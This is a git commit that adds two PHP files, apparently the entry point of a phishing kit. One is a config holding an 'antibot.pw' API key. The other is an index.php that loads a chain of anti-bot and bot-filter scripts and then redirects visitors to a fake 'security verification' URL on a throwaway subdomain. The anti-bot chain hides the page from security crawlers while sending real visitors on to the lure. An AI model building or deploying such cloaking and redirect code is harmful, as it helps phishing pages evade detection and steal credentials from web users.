d21073a58795158c1c3f3a4250732ae6c69cff3b
H3X0M <110427135+H3X0M@users.noreply.github.com>
2023-07-18 01:45:39 +0700

    Add files via upload

---
+++ antibot-config.php
@@ -0,0 +1,9 @@
+<?php
+/**
+ * @Author: Nokia 1337
+ * @Date:   2019-09-30 10:55:56
+ * @Last Modified by:   Nokia 1337
+ * @Last Modified time: 2019-10-26 03:37:17
+*/
+
+$config['apikey'] 		= '40b4e226f1069aa45fa8520f422181fa';  // https://antibot.pw/dashboard/developers
---
+++ index.php
@@ -0,0 +1,19 @@
+<?php
+include 'anti1.php';
+include 'anti2.php';
+include 'anti3.php';
+include 'anti4.php';
+include 'anti5.php';
+include 'anti6.php';
+include 'anti7.php';
+include 'anti8.php';
+include 'algo.php';
+include 'bot.php';
+include 'antibot.php';
+require_once('autoload.php'); 
+/* Redirect browser */
+header("Location: https://server2update.ipq.co/secued/security-webservice/verification/");
+ 
+/* Make sure that code below does not get executed when we redirect. */
+exit;
+?>
